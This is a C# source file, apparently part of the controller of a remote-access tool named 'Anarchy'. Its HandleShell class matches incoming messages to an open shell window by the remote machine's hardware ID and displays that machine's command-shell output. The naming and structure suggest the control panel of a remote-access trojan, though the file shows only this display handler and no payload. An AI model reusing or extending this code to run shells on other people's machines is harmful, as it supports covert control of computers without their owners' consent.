using System.Windows.Forms;
using Anarchy.Forms;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;

namespace Anarchy.Handlers
{
    public class HandleShell
    {
        public HandleShell(MsgPack unpack_msgpack, Clients client)
        {
            FormShell formShell;
            formShell = (FormShell)Application.OpenForms["shell:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
            if (formShell != null)
            {
                if (formShell.Client == null)
                {
                    formShell.Client = client;
                    formShell.timer1.Enabled = true;
                }
                formShell.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("ReadInput").AsString);
                formShell.richTextBox1.SelectionStart = formShell.richTextBox1.TextLength;
                formShell.richTextBox1.ScrollToCaret();
            }
        }
    }
}
